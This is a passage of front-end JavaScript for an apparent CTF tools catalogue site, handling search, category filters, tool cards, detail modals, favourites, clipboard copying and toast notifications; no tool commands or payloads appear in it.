    categoryNavBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            setActiveCategory(btn.dataset.category);
        });
    });
    
    // Theme toggle
    themeToggle.addEventListener('click', toggleTheme);
    
    // Modal
    modal.addEventListener('click', (e) => {
        if (e.target === modal || e.target.classList.contains('modal-close')) {
            closeModal();
        }
    });
    
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') {
            closeModal();
        }
    });
    
    // Keyboard shortcuts
    document.addEventListener('keydown', (e) => {
        if (e.ctrlKey && e.key === 'k') {
            e.preventDefault();
            searchInput.focus();
        }
    });
}

function toggleClearButton() {
    clearSearchBtn.style.display = searchTerm ? 'flex' : 'none';
}

function setActiveCategory(category) {
    currentCategory = category;
    categoryFilter.value = category === 'all' ? '' : category;
    
    // Update navigation buttons
    categoryNavBtns.forEach(btn => {
        btn.classList.toggle('active', btn.dataset.category === category);
    });
    
    renderTools();
}

// Tool Rendering
function renderTools() {
    const filteredTools = getFilteredTools();
    
    if (filteredTools.length === 0) {
        toolsContainer.style.display = 'none';
        noResults.style.display = 'block';
        return;
    }
    
    toolsContainer.style.display = 'grid';
    noResults.style.display = 'none';
    
    toolsContainer.innerHTML = filteredTools.map(tool => createToolCard(tool)).join('');
    
    // Add event listeners to tool cards
    document.querySelectorAll('.tool-card').forEach(card => {
        const toolId = card.dataset.toolId;
        const tool = ctfTools.find(t => t.id === toolId);
        
        card.addEventListener('click', (e) => {
            if (!e.target.closest('.favorite-btn')) {
                openToolModal(tool);
            }
        });
        
        const favoriteBtn = card.querySelector('.favorite-btn');
        favoriteBtn.addEventListener('click', (e) => {
            e.stopPropagation();
            toggleFavorite(toolId);
        });
    });
}

function getFilteredTools() {
    return ctfTools.filter(tool => {
        const matchesCategory = currentCategory === 'all' || tool.category === currentCategory;
        const matchesDifficulty = !currentDifficulty || tool.difficulty === currentDifficulty;
        const matchesSearch = !searchTerm || 
            tool.name.toLowerCase().includes(searchTerm) ||
            tool.description.toLowerCase().includes(searchTerm) ||
            tool.tags.some(tag => tag.toLowerCase().includes(searchTerm)) ||
            tool.category.toLowerCase().includes(searchTerm);
        
        return matchesCategory && matchesDifficulty && matchesSearch;
    });
}

function createToolCard(tool) {
    const isFavorited = favoriteTools.includes(tool.id);
    
    return `
        <div class="tool-card" data-tool-id="${tool.id}">
            <div class="tool-header">
                <div class="tool-icon">
                    <i class="${tool.icon}"></i>
                </div>
                <div class="tool-info">
                    <h3 class="tool-name">${tool.name}</h3>
                    <span class="tool-category">${getCategoryName(tool.category)}</span>
                </div>
            </div>
            <p class="tool-description">${tool.description}</p>
            <div class="tool-tags">
                ${tool.tags.map(tag => `<span class="tool-tag">${tag}</span>`).join('')}
            </div>
            <div class="tool-actions">
                <button class="favorite-btn ${isFavorited ? 'favorited' : ''}" title="${isFavorited ? 'Remove from favorites' : 'Add to favorites'}">
                    <i class="fas fa-star"></i>
                </button>
                <span class="difficulty-badge difficulty-${tool.difficulty}">${tool.difficulty}</span>
            </div>
        </div>
    `;
}

function getCategoryName(category) {
    const names = {
        'web': 'Web Security',
        'pwn': 'Binary Exploitation',
        'crypto': 'Cryptography',
        'forensics': 'Digital Forensics',
        'reverse': 'Reverse Engineering',
        'osint': 'OSINT',
        'misc': 'Miscellaneous'
    };
    return names[category] || category;
}

// Modal Management
function openToolModal(tool) {
    modalTitle.textContent = tool.name;
    modalContent.innerHTML = createModalContent(tool);
    modal.style.display = 'flex';
    document.body.style.overflow = 'hidden';
    
    // Add copy button event listeners
    document.querySelectorAll('.copy-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            const code = e.target.dataset.code;
            copyToClipboard(code);
        });
    });
}

function closeModal() {
    modal.style.display = 'none';
    document.body.style.overflow = 'auto';
}

function createModalContent(tool) {
    let content = `
        <div class="tool-details">
            <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 20px;">
                <div class="tool-icon" style="width: 60px; height: 60px; font-size: 2rem;">
                    <i class="${tool.icon}"></i>
                </div>
                <div>
                    <h2>${tool.name}</h2>
                    <span class="tool-category">${getCategoryName(tool.category)}</span>
                    <span class="difficulty-badge difficulty-${tool.difficulty}" style="margin-left: 10px;">${tool.difficulty}</span>
                </div>
            </div>
            
            <div class="tool-tags" style="margin-bottom: 20px;">
                ${tool.tags.map(tag => `<span class="tool-tag">${tag}</span>`).join('')}
            </div>
            
            <h3>Description</h3>
            <p style="margin-bottom: 20px; line-height: 1.6;">${tool.description}</p>
            
            <h3>Usage</h3>
            <p style="margin-bottom: 20px; line-height: 1.6;">${tool.usage}</p>
    `;
    
    if (tool.commands && tool.commands.length > 0) {
        content += '<h3>Commands & Examples</h3>';
        tool.commands.forEach(cmd => {
            content += `
                <div class="code-block">
                    <div class="code-header">
                        <span class="code-language">${cmd.language.toUpperCase()}</span>
                        <button class="copy-btn" data-code="${escapeHtml(cmd.code)}" title="Copy to clipboard">
                            <i class="fas fa-copy"></i> Copy
                        </button>
                    </div>
                    <div class="code-content"><pre><code class="language-${cmd.language}">${escapeHtml(cmd.code)}</code></pre></div>
                    ${cmd.description ? `<div class="desc">${cmd.description}</div>` : ''}
                </div>
            `;
        });
    }
    
    if (tool.tips && tool.tips.length > 0) {
        content += '<h3>Pro Tips</h3><ul>';
        tool.tips.forEach(tip => {
            content += `<li style="margin-bottom: 10px;">${tip}</li>`;
        });
        content += '</ul>';
    }
    
    content += '</div>';
    
    return content;
}

// Favorites Management
function toggleFavorite(toolId) {
    const index = favoriteTools.indexOf(toolId);
    if (index > -1) {
        favoriteTools.splice(index, 1);
        showToast('Removed from favorites', 'success');
    } else {
        favoriteTools.push(toolId);
        showToast('Added to favorites', 'success');
    }
    
    localStorage.setItem('ctf-favorites', JSON.stringify(favoriteTools));
    updateFavoritesDisplay();
    renderTools(); // Re-render to update favorite buttons
}

function updateFavoritesDisplay() {
    favoritesCount.textContent = favoriteTools.length;
    
    if (favoriteTools.length === 0) {
        favoritesList.innerHTML = '<p style="color: var(--text-muted); text-align: center;">No favorites yet</p>';
        return;
    }
    
    const favoriteToolsData = favoriteTools.map(id => ctfTools.find(tool => tool.id === id)).filter(Boolean);
    
    favoritesList.innerHTML = favoriteToolsData.map(tool => `
        <div style="display: flex; align-items: center; gap: 10px; padding: 10px; background: var(--bg-tertiary); border-radius: var(--border-radius); margin-bottom: 10px; cursor: pointer;" onclick="openToolModalById('${tool.id}')">
            <i class="${tool.icon}" style="color: var(--primary-green);"></i>
            <div style="flex: 1;">
                <div style="font-weight: 500;">${tool.name}</div>
                <div style="font-size: 0.8rem; color: var(--text-muted);">${getCategoryName(tool.category)}</div>
            </div>
        </div>
    `).join('');
}

function openToolModalById(toolId) {
    const tool = ctfTools.find(t => t.id === toolId);
    if (tool) {
        openToolModal(tool);
    }
}

// Utility Functions
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        showToast('Copied to clipboard!', 'success');
    }).catch(() => {
        // Fallback for older browsers
        const textArea = document.createElement('textarea');
        textArea.value = text;
        document.body.appendChild(textArea);
        textArea.select();
        document.execCommand('copy');
        document.body.removeChild(textArea);
        showToast('Copied to clipboard!', 'success');
    });
}

function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, function(m) { return map[m]; });
}

function showToast(message, type = 'info') {
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.textContent = message;
    
    toastContainer.appendChild(toast);
    
    // Trigger animation
    setTimeout(() => toast.classList.add('show'), 100);
    
    // Remove toast after 3 seconds
    setTimeout(() => {
        toast.classList.remove('show');
        setTimeout(() => toastContainer.removeChild(toast), 300);
    }, 3000);
}

function hideLoadingScreen() {
    setTimeout(() => {
        loadingScreen.style.opacity = '0';
        setTimeout(() => {
            loadingScreen.style.display = 'none';
        }, 300);
    }, 1000);
}

// Make functions available globally for inline event handlers
window.openToolModalById = openToolModalById;
